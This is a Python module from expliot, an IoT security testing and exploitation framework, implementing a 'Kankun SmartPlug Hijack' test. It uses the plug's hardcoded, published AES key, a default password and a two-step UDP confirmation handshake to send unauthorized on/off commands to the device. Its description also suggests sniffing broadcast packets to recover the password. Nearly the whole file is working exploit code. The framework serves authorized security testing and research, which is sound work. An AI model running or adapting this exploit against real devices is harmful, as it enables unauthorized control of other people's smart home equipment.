#
#
# expliot - Internet Of Things Security Testing and Exploitation Framework
# 
# Copyright (C) 2018  Aseem Jakhar
#
# Email:   aseemjakhar@gmail.com
# Twitter: @aseemjakhar
#
# THIS SOFTWARE IS PROVIDED ``AS IS'' AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
# BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
# PARTICULAR PURPOSE ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS
# BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
# THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE
# OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.
#

import socket, re
from Crypto.Cipher import AES
from expliot.core.tests.test import *

class KHijack(Test):

    def __init__(self):
        super().__init__(name     = "Kankun SmartPlug Hijack",
                         summary  = "Remotely Switch Kankun SmartPlug ON/OFF",
                         descr    = """This test case connects to the Kankun SmartPlug and sends unauthorized
                                        switch ON/OFF commands to it. If you don't know the password, try with
                                        the default or sniff the network for UDP packets as the commands
                                        containing the password are broadcasted. You can decrypt the packets
                                        easily using the AES key which is published""",
                         author   = "Aseem Jakhar and Sneha Rajguru",
                         email    = "aseemjakhar@gmail.com",
                         ref      = ["https://payatu.com/hijacking-kankun/"],
                         category = TCategory(TCategory.UDP, TCategory.SW, TCategory.EXPLOIT),
                         target   = TTarget("kankun", "1.0", "ikonke.com"))

        self.argparser.add_argument("-r", "--rhost", required=True,
                                    help="IP address of kankun smartplug")
        self.argparser.add_argument("-p", "--rport", default=27431, type=int,
                                    help="Port number of the smartplug service. Default is 27431")
        self.argparser.add_argument("-m", "--rmac", required=True,
                                    help="""MAC address of kankun smartplug. Use colon delimited
                                            format with hex digits in small letters ex. ff:ee:dd:00:01:02""")
        self.argparser.add_argument("-w", "--passwd", default="nopassword",
                                    help="The password (if any) for kankun. Default is the string \"nopassword\"")
        self.argparser.add_argument('-c', '--cmd', required=True,
                                    help="The command to send to the smartplug. Valid commands are on / off")

        self.key = "fdsl;mewrjope456fds4fbvfnjwaugfo"


    def cipher(self, str, encrypt=True):
        """

        Encrypt/Decrypt a string using the known AES key of the smartplug.

        :param str: string to encrypt or decrypt
        :param encrypt: True means encrypt (default), false means decrypt
        :return: The encrypted/decrypted string
        """
        aesobj = AES.new(self.key, AES.MODE_ECB)
        if str:
            # AES requires the input length to be in multiples of 16
            while (len(str) % 16 is not 0):
                str = str + " "
            if encrypt is True:
                return aesobj.encrypt(str)
            else:
                return aesobj.decrypt(str)
        else:
            return None

    def send_recv(self, ip, port, m):
        """
        Send and then receive encrypted data to/from the smartplug

        :param ip: IP address of the smartplug
        :param port: Port number of the listening service
        :param m: plaintext message
        :return: The response received from the smartplug
        """
        ret = None
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect((ip, port))
            s.send(self.cipher(m))
            ret = s.recv(1024)
            ret = self.cipher(ret, encrypt=False)
        except:
            TLog.fail("Couldnt receive/decrypt response")
        finally:
            s.close()
        return ret

    def createmsg(self, cmd, cid=None):
        """
        Create the command message to be sent to the the smartplug

        :param cmd: the command to send - open/close/confirm
        :param cid: confirmation id used in confirm command
        :return: The command message
        """
        msg = "lan_phone%{}%{}".format(self.args.rmac, self.args.passwd)
        if cmd == "open":
                msg = "{}%open%request".format(msg)
        elif cmd == "close":
                msg = "{}%close%request".format(msg)
        elif cmd == "confirm":
            msg = "{}%confirm#{}%request".format(msg, cid)
        return msg

    def get_confirmid(self, m):
        """
        Extract the confirmation id from the response message
        :param self:
        :param m: The response message
        :return: The confirmation id
        """
        p = re.search(r"confirm#(\w+)", m.decode('utf-8'))  # get the confirmation ID number only!!
        if p is not None:
            return p.group(1)
        else:
            return None

    def execute(self):
        TLog.generic("Sending Unauthorized command ({}) to kankun smartplug on ({}) port ({})".format(self.args.cmd,
                                                                                                      self.args.rhost,
                                                                                                      self.args.rport))
        op = None
        print("--cmd ({}) cmd is on? ({})".format(self.args.cmd, (self.args.cmd == "on")))
        if self.args.cmd.lower() == "on":
            op = "open"
        elif self.args.cmd.lower() == "off":
            op = "close"
        else:
            self.result.setstatus(passed=False, reason="Unknown --cmd ({})".format(self.args.cmd))
            return
        m = self.createmsg(op)
        ret = None
        TLog.trydo("Sending {} command: ({})".format(op, m))
        # Step 1: Send command and receive the confirmation ID response
        ret = self.send_recv(self.args.rhost, self.args.rport, m)
        if ret is None:
            self.result.setstatus(passed=False, reason="Communication error while sending message({})".format(m))
            return

        TLog.success("Received response: ({})".format(ret.decode('utf-8')))
        # Get the confirmation ID
        cid = self.get_confirmid(ret)
        if cid is None:
            self.result.setstatus(passed=False, reason="Couldn't extract confirmation id from ({})".format(ret))
            return
        TLog.success("Received Confirmation ID: ({})".format(cid))
        m = self.createmsg("confirm", cid)
        TLog.trydo("Sending confirm command: ({})".format(m))
        # Step 2: Send Confirmation command with the confirmation ID and receive ack response
        ret = self.send_recv(self.args.rhost, self.args.rport, m)
        if ret is None:
            self.result.setstatus(passed=False, reason="Communication error while sending message({})".format(m))
            return
        TLog.success("Received response: ({})".format(ret.decode('utf-8')))